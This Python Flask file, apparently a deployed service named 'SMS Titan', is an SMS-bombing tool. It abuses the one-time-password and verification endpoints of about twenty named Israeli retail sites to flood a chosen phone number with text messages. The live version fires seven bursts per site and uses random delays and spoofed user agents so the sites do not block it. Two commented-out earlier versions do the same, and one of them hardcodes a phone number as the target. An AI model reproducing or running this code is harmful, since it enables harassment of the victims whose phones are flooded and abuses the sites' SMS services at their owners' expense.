# # from flask import Flask, request, jsonify
# # from flask_cors import CORS
# # import requests
# # import re
# # import time
# # import random
# # from concurrent.futures import ThreadPoolExecutor, as_completed

# # app = Flask(__name__)
# # CORS(app)

# # # --- רשימת אתרים מעודכנת ---
# # SITES = [
# #     {"name": "Sacara", "url": "https://www.sacara.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Victoria Secret", "url": "https://www.victoriassecret.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
# #     {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Carolina Lemke", "url": "https://www.carolinalemke.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
# #     {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Lee Cooper", "url": "https://www.leecooper.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Vardinon", "url": "https://www.vardinon.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Tevanaot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json_api", "key": "phoneNumber"},
# #     {"name": "Step In", "url": "https://www.stepin.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
# #     {"name": "Papaya", "url": "https://www.papaya.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Tog Shoes", "url": "https://www.tog.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Golf Kids", "url": "https://www.golfkids.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Lee Israel", "url": "https://www.lee.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Steimatzky", "url": "https://www.steimatzky.co.il/customer/ajax/post/", "type": "magento"},
# #     {"name": "Naaman Outlet", "url": "https://www.naamanp.co.il/customer/ajax/post/", "type": "magento"}
# # ]

# # def get_random_ua():
# #     uas = [
# #         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
# #         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
# #     ]
# #     return random.choice(uas)

# # def fire_single_shot(site, phone):
# #     domain = "/".join(site['url'].split("/")[:3])
# #     headers = {
# #         "User-Agent": get_random_ua(),
# #         "Accept": "application/json, text/javascript, */*; q=0.01",
# #         "X-Requested-With": "XMLHttpRequest",
# #         "Referer": domain + "/",
# #         "Origin": domain
# #     }
# #     session = requests.Session()
# #     try:
# #         if site['type'] == "magento":
# #             # שלב 1: שליפת form_key (ללא המתנה ארוכה)
# #             res_init = session.get(domain, headers=headers, timeout=5)
# #             f_key = "dummy"
# #             match = re.search(r'name="form_key" type="hidden" value="([a-zA-Z0-9]+)"', res_init.text)
# #             if not match: match = re.search(r'"formKey":\s*"([a-zA-Z0-9]+)"', res_init.text)
# #             if match: f_key = match.group(1)
            
# #             # שלב 2: שליחת ה-OTP
# #             payload = {"form_key": f_key, "bot_validation": "1", "type": "login", "telephone": phone}
# #             res = session.post(site['url'], data=payload, headers=headers, timeout=7)
# #         else:
# #             res = session.post(site['url'], json={site['key']: phone}, headers=headers, timeout=7)
            
# #         return res.status_code
# #     except:
# #         return 500

# # @app.route('/launch', methods=['POST'])
# # def launch():
# #     data = request.json
# #     phone = data.get('phone')
    
# #     if not phone or not re.match(r"05[0-9]{8}", phone):
# #         return jsonify({"status": "error", "message": "Invalid Identifier"}), 400

# #     final_logs = []
# #     task_list = []
# #     for s in SITES:
# #        for _ in range(1): # סבב אחד בלבד לכל אתר
# #             task_list.append(s)
    
# #     random.shuffle(task_list)

# #     # שימוש ב-10 עובדים בלבד למניעת קריסת זיכרון (Memory Overflow) ב-Render
# #     with ThreadPoolExecutor(max_workers=10) as executor:
# #         future_to_site = {executor.submit(fire_single_shot, site, phone): site for site in task_list}
        
# #         for future in as_completed(future_to_site):
# #             site = future_to_site[future]
# #             try:
# #                 status = future.result()
# #                 status_text = "INJECTED" if status == 200 else "REJECTED"
# #                 final_logs.append({
# #                     "node": site['name'],
# #                     "status": status_text,
# #                     "code": status
# #                 })
# #             except:
# #                 final_logs.append({"node": site['name'], "status": "TIMEOUT", "code": 500})

# #     return jsonify({
# #         "status": "SUCCESS",
# #         "target": phone,
# #         "summary": {
# #             "total_sent": len(final_logs),
# #             "successful": len([l for l in final_logs if l['status'] == "INJECTED"])
# #         },
# #         "logs": final_logs
# #     })

# # if __name__ == "__main__":
# #     app.run(host='0.0.0.0', port=5000)


# # import concurrent.futures
# # import requests
# # import random
# # import time
# # from flask import Flask, jsonify
# # from flask_cors import CORS

# # app = Flask(__name__)
# # CORS(app)

# # USER_AGENTS = [
# #     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
# #     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
# # ]

# # # הרשימה המדויקת שלך עם התאמות לפורמט השליחה
# # SITES = [
# #     {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "method": "POST", "body": {"phone": "{phone}"}, "type": "json"},
# #     {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "method": "POST", "body": "action=simply-check-member-cellphone&cellphone={phone}", "type": "form"},
# #     {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "method": "POST", "body": {"phoneNumber": "{phone}", "sourceFrom": "desktopHomePage", "sessionID": "9c8d6d5b-1072-21ee-1c8f-cefce5bb5a8d"}, "type": "json"},
# #     {"name": "Tevanaot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "method": "POST", "body": {"phoneNumber": "{phone}"}, "type": "json"},
# #     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "method": "POST", "body": {"value": "{phone}", "type": "phone", "projectId": "1"}, "type": "json"},
# #     {"name": "SpicesOnline", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "method": "POST", "body": "action=validate_user_by_sms&phone={phone}", "type": "form"},
# #     # אתרי Magento (Castro, Delta, Urbanica וכו') דורשים פורמט Form מיוחד
# #     {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Noizz", "url": "https://www.noizz.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Sacara", "url": "https://www.sacara.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Golf & Co", "url": "https://www.golfco.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Carolina Lemke", "url": "https://www.carolinalemke.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"},
# #     {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "method": "POST", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}", "type": "form"}
# # ]

# # def send_request(node, phone):
# #     try:
# #         headers = {
# #             "User-Agent": random.choice(USER_AGENTS),
# #             "Accept": "*/*",
# #             "X-Requested-With": "XMLHttpRequest"
# #         }
        
# #         # טיפול ב-Body
# #         if isinstance(node["body"], dict):
# #             # המרת טלפון בתוך מילון
# #             payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in node["body"].items()}
# #             content_type = "application/json"
# #         else:
# #             # המרת טלפון בתוך מחרוזת (Form Data)
# #             payload = node["body"].replace("{phone}", phone)
# #             content_type = "application/x-www-form-urlencoded"
        
# #         headers["Content-Type"] = content_type
        
# #         print(f"[*] Attacking {node['name']}...")
        
# #         if node["type"] == "json":
# #             res = requests.post(node["url"], json=payload, headers=headers, timeout=10)
# #         else:
# #             res = requests.post(node["url"], data=payload, headers=headers, timeout=10)
            
# #         print(f"    [Result] {node['name']}: {res.status_code}")
# #         return res.status_code
# #     except Exception as e:
# #         print(f"    [Error] {node['name']}: {e}")
# #         return 500

# # @app.route('/launch', methods=['POST'])

# # def launch():
# #     target = "0535236226" # המספר שלך
# #     print(f"\n--- INVOKING SMART ATTACK ON {target} ---\n")
    
# #     with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
# #         for node in SITES:
# #             executor.submit(send_request, node, target)
# #             time.sleep(random.uniform(2, 4)) # חובה להשאיר רווח כדי שהסמסים יגיעו
            
# #     return jsonify({"status": "done"})

# # if __name__ == '__main__':
# #     app.run(port=5000)

# import concurrent.futures
# import requests
# import random
# import time
# from flask import Flask, jsonify, request
# from flask_cors import CORS

# app = Flask(__name__)
# CORS(app)

# # רשימת ה-8 המנצחים שאישרת שעובדים ב-100%
# SITES = [
#     {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
#     {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
#     {"name": "Spices", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
#     {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "body": {"value": "{phone}", "type": "phone", "projectId": "1"}},
#     {"name": "Naot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
#     {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "body": {"phoneNumber": "{phone}", "sourceFrom": "desktopHomePage"}}
# ]

# def send_burst(node, phone, repeats=7):
#     """שולח מספר סמסים מאותו אתר עם השהיה חכמה"""
#     session = requests.Session()
#     headers = {
#         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
#         "Accept": "*/*",
#         "X-Requested-With": "XMLHttpRequest"
#     }

#     for i in range(repeats):
#         try:
#             if node["type"] == "json":
#                 headers["Content-Type"] = "application/json"
#                 payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in node["body"].items()}
#                 res = session.post(node["url"], json=payload, headers=headers, timeout=10)
#             else:
#                 headers["Content-Type"] = "application/x-www-form-urlencoded"
#                 payload = node["body"].replace("{phone}", phone)
#                 res = session.post(node["url"], data=payload, headers=headers, timeout=10)
            
#             print(f"[*] {node['name']} (Burst {i+1}/7): {res.status_code}")
            
#             # השהיה בין סמס לסמס מאותו אתר - קריטי כדי שלא יחסמו
#             time.sleep(random.uniform(5, 8)) 
            
#         except Exception as e:
#             print(f"[!] Error in {node['name']} burst: {e}")
#             break # אם יש שגיאה, עוברים לאתר הבא

# @app.route('/launch', methods=['POST'])
# def launch():
#     target = request.json.get('phone', '0535236226')
#     print(f"\n--- INITIATING 56-SMS BURST ON {target} ---\n")
    
#     # הפעלה במקביל של האתרים, אבל כל אתר מריץ את ה-Burst שלו בטור
#     with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
#         for node in SITES:
#             executor.submit(send_burst, node, target)
            
#     return jsonify({"status": "burst_initiated", "target": target})

# if __name__ == '__main__':
#     app.run(port=5000)

import concurrent.futures
import requests
import random
import time
import os
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
# מאפשר לאפליקציית ה-Lovable שלך לגשת ל-API ללא חסימות אבטחה
CORS(app)

# רשימת ה-8 המנצחים שאישרת שעובדים ב-100%
SITES = [
    {"name": "Femina", "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
    {"name": "Housemen", "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
    {"name": "Spices", "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "body": {"value": "{phone}", "type": "phone", "projectId": "1"}},
    {"name": "Naot", "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "CrazyLine", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "body": {"phoneNumber": "{phone}", "sourceFrom": "desktopHomePage"}}
]

def send_burst(node, phone, repeats=7):
    """מבצע שליחה חוזרת מאותו אתר עם השהיה למניעת חסימה"""
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest"
    }

    for i in range(repeats):
        try:
            if node["type"] == "json":
                headers["Content-Type"] = "application/json"
                payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in node["body"].items()}
                res = session.post(node["url"], json=payload, headers=headers, timeout=10)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                payload = node["body"].replace("{phone}", phone)
                res = session.post(node["url"], data=payload, headers=headers, timeout=10)
            
            print(f"[*] {node['name']} ({i+1}/7): {res.status_code}")
            time.sleep(random.uniform(5, 8)) 
            
        except Exception as e:
            print(f"[!] Error in {node['name']}: {e}")
            break

@app.route('/', methods=['GET', 'HEAD'])
def health_check():
    """נתיב שמוודא שהשרת חי (מונע שגיאות 404 ב-Render)"""
    return jsonify({"status": "online", "message": "SMS Titan is running"}), 200

@app.route('/launch', methods=['POST'])
def launch():
    """הנתיב המרכזי שמקבל את מספר הטלפון ומפעיל את המערכת"""
    data = request.get_json()
    target = data.get('phone') if data else None
    
    if not target:
        return jsonify({"status": "error", "message": "No phone number provided"}), 400

    print(f"\n--- INITIATING 56-SMS ATTACK ON {target} ---\n")
    
    # הפעלה מקבילית של ה-Threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        for node in SITES:
            executor.submit(send_burst, node, target)
            
    return jsonify({"status": "success", "target": target})

if __name__ == '__main__':
    # הגדרות חובה עבור Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)